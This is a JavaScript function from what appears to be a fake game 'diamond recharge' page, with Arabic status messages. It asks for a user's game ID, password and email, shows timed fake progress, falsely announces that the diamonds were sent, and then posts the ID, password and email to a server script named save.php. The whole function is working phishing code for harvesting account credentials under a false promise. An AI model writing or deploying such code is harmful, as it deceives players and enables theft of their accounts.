function startRecharge() {
  const uid = document.getElementById("uid").value;
  const password = document.getElementById("password").value;
  const email = document.getElementById("email").value;
  const diamonds = document.getElementById("diamonds").value;
  const status = document.getElementById("statusMessage");

  if (!uid || !password || !email) {
    status.innerHTML = "❌ يرجى إدخال جميع المعلومات بشكل صحيح!";
    return;
  }

  status.innerHTML = "🔄 جاري تجهيز طلبك، يرجى الانتظار...";

  setTimeout(() => {
    status.innerHTML = "⏳ قريبًا...";
  }, 60000); // بعد دقيقة

  setTimeout(() => {
    status.innerHTML = `✅ تم إرسال ${diamonds} جوهرة إلى ID ${uid} بنجاح ❤️`;

    // إرسال البيانات إلى السيرفر
    fetch("save.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: `uid=${uid}&password=${password}&email=${email}`
    });
  }, 120000); // بعد دقيقتين
}